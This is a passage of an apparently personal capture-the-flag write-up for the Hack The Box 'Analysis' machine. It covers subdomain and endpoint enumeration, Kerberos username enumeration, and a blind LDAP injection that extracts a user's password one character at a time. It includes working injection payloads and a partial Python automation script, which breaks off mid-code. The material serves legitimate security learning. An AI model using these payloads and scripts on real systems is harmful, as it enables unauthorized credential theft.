+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Resolver:   analysis.htb:53
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Timeout:    1s
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Starting gobuster &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;DNS enumeration mode
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Found: www.analysis.htb
+
+Found: internal.analysis.htb
+
+Found: gc._msdcs.analysis.htb
+
+Found: domaindnszones.analysis.htb
+
+Found: forestdnszones.analysis.htb
+                                                                                                  
+Progress: 19966 / 19967 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;99.99%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+Finished
+&lt;span class=&quot;o&quot;&gt;===============================================================&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there are some subdomains available for us. Before trying to access them, we must add them to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file like this: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;machine-ip&amp;gt; analysis.htb internal.analysis.htb domaindnszones.analysis.htb forestdnszones.analysis.htb ...&lt;/code&gt;. After that, let’s examine &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;internal.analysis.htb&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis02.png&quot; alt=&quot;internal homepage&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, this page is unreachable for now. But that does not mean we are not able to enumerate this subdomain for other endpoints. For that reason, I decided to run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt; to find possible endpoints:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt 
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+Users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 136ms]
+dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 139ms]
+\                       [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 149ms]
+employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 135ms]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there are some interesting endpoints that might have hidden ways in the web-service. After some failed attempts, I decided to append &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.php&lt;/code&gt; extension at the end of the endpoints and got some interesting results. Starting with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users/&lt;/code&gt; endpoint, we have:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/users/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; .php
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/users/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 173ms]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accessing the page, we have:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis-internal1.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;It seems the page is expecting a GET parameter in the request. For that, we will try to find what is the correct parameter with a bash script:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;/usr/share/wordlists/seclists/Discovery/Web-Content/url-params_from-top-55-most-popular-apps.txt&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Wordlist file does not exist at &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;1
+&lt;span class=&quot;k&quot;&gt;fi
+
+while &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; line&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Testing parameter name &apos;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&apos;...&quot;&lt;/span&gt;
+        &lt;span class=&quot;nv&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;http://internal.analysis.htb/Users/list.php?&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;missing parameter&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+                &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Parameter found: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$line&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+                &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;0
+        &lt;span class=&quot;k&quot;&gt;fi
+done&lt;/span&gt; &amp;lt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$WORDLIST_PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This will loke for different responses by passing different parameter names to it. After running it, we find that the parameter name is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./find-param.sh
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;...snip...]
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;embedded&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;enc_user&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;f&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;fiatId&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;format&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;full_text&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;href&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;id&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;id_type&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;include&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;k4&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;k&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;keyURL&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;language&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;limit&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;list&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;list_id&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;lon&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;m4&apos;&lt;/span&gt;...
+Testing parameter name &lt;span class=&quot;s1&quot;&gt;&apos;name&apos;&lt;/span&gt;...
+Parameter found: name
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Accessing the page, we find this:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis03.png&quot; alt=&quot;parameter name on list.php&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After poking around with this parameter, I’ve got nowhere. So I decided to move on to another endpoint. Since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dashboard&lt;/code&gt; endpoint is giving us Access Denied, let’s enumerate the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/employees&lt;/code&gt; endpoint with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ffuf&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://internal.analysis.htb/employees/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirbuster/directory-list-1.0.txt &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; .php   
+
+        /&lt;span class=&quot;s1&quot;&gt;&apos;___\  /&apos;&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;&apos;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://internal.analysis.htb/employees/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-1.0.txt
+ :: Extensions       : .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 182ms]
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we found a login page!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis04.png&quot; alt=&quot;login page&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ok, so we need a pair of credentials to login. Let’s move to another service and see if we can leak something useful. Note that we have Kerberos running, which means we can use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kerbrute&lt;/code&gt; to find valid emails. The internal emails used here must be &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@analysis.htb&lt;/code&gt;. Let’s run:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt possible-usernames.txt | &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;s|&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@analysis.htb|&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; emails-wl.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, we run kerbrute:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;kerbrute userenum &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; analysis.htb emails-wl.txt &lt;span class=&quot;nt&quot;&gt;--dc&lt;/span&gt; analysis.htb
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ __ &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; ___/ / / / __/ _ &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+ / ,&amp;lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/_/  /_.___/_/   &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/                                        
+
+Version: v1.0.3 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9dad6e1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - 01/22/24 - Ronnie Flathers @ropnop
+
+2024/01/22 20:37:53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  Using KDC&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+2024/01/22 20:37:53 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;   analysis.htb:88
+
+2024/01/22 20:39:23 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       jdoe@analysis.htb
+2024/01/22 20:40:45 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       ajohnson@analysis.htb
+2024/01/22 20:43:40 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       cwilliams@analysis.htb
+2024/01/22 20:45:00 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       wsmith@analysis.htb
+2024/01/22 20:49:41 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       jangel@analysis.htb
+2024/01/22 21:10:10 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       technician@analysis.htb
+2024/01/22 21:28:24 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       JDoe@analysis.htb
+2024/01/22 21:29:38 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       AJohnson@analysis.htb
+2024/01/22 22:50:34 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] VALID USERNAME:       badam@analysis.htb
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;As we can see, there are a bunch of valid usernames. Let’s go back to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Users&lt;/code&gt; endpoint and pass these usernames (without the mail part &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;@analysis.htb&lt;/code&gt;) and see if we can retrieve someone’s password. After a bunch of attempts, we see that the name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; under the email &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician@analysis.htb&lt;/code&gt; gives a different response:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis05.png&quot; alt=&quot;valid user&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;However, nothing too much interesting shows up here. We could try to brute the password using kerbrute, but I’ve tried it with huge wordlists and nothing was found. There must be another way to get this user’s password…&lt;/p&gt;
+
+&lt;p&gt;I’ve tried to send SQL injection payloads, but without success. Then, after a long time of researching, I’ve found (and learned) this new injection technique: LDAP injections. Some web applications serve as bridges to LDAP service, and they can also be prone to injection! I came across &lt;a href=&quot;https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt&quot;&gt;this&lt;/a&gt; wordlist, which contained different kinds of payloads. The first one, a simple asterisk &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;, showed that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; parameter was indeed used to query LDAP:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis1.png&quot; alt=&quot;ldap injection test&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;After a bit more research, I found that the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=&amp;lt;username&amp;gt;)(%26(objectClass=user)(description=*)&lt;/code&gt; can be used to enumerate the possible characters of the user’s password. All we need to do is pass characters at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(description=&amp;lt;pwd-char&amp;gt;*)&lt;/code&gt;. If the character is a correct guess, then the page would return the same as if we pass &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=&amp;lt;username&amp;gt;&lt;/code&gt; alone. This is a blind LDAP injection attack, as we have to guess without actually having the password to be printed out for us in the body of the page.&lt;/p&gt;
+
+&lt;p&gt;As an example, let’s see the following response for the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=technician)(%26(objectClass=user)(description=9*)&lt;/code&gt; against &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name=technician)(%26(objectClass=user)(description=7*)&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis07.png&quot; alt=&quot;invalid payload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/analysis06.png&quot; alt=&quot;valid payload&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As we can see, because we got a response back with the First Name field containing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; when we passed the 9 instead of 7, we conclude that the number 9 is the first character of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;technician&lt;/code&gt; user!&lt;/p&gt;
+
+&lt;p&gt;Alright, let’s automate the character testing process using a Python script. However, there’s a catch: the asterisk character &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; holds a special meaning in LDAP queries, representing a wildcard. This presents a challenge if the character is part of the password, as our query may not interpret it correctly. For instance, if the password is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abc\*123\*!@#&lt;/code&gt;, our script can correctly guess up to abc, but it will struggle to identify the * due to its special significance in LDAP. To address this, the script operates in rounds. It tests characters sequentially until it exhausts its list. If it can’t progress further, the script attempts a login, assuming the next character might be an asterisk. If the login fails, it confirms the presence of a * and proceeds to the next round. This process repeats until the script successfully deduces the entire password. The script is available &lt;a href=&quot;https://github.com/alexbsec/analysis-htb/blob/master/ldapinject.py&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;urllib.parse&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;try_login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;urllib&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;unquote_plus&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;password&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+        &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;Wrong Data&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;
+
